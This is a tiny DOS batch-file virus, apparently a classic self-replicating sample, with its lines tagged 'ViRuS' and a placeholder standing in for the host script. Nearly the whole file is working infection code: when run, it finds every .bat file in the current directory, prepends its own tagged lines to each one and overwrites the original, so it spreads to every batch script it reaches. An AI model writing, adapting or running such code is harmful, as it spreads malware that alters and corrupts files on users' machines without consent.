@ECHO OFF>nul.ViRuS
if "%1=="/ViRuS_THE_PROCEDURE goto ViRuS_the_procedure
for %%a in (*.bat) do call %0 /ViRuS_THE_PROCEDURE %%a
goto ViRuS_OLDBAT
:ViRuS_the_procedure
find "ViRuS" <%0.bat >xViRuSx.bat
find /v "ViRuS" <%2 |find /v ":XXX_END" >>xViRuSx.bat
echo :XXX_END>>xViRuSx.bat
copy xViRuSx.bat %2>nul
del xViRuSx.bat>nul.ViRuS
goto XXX_END>nul.ViRuS
:ViRuS_OLDBAT
ECHO ON>nul.ViRuS
echo This is the dummy original batch
:XXX_END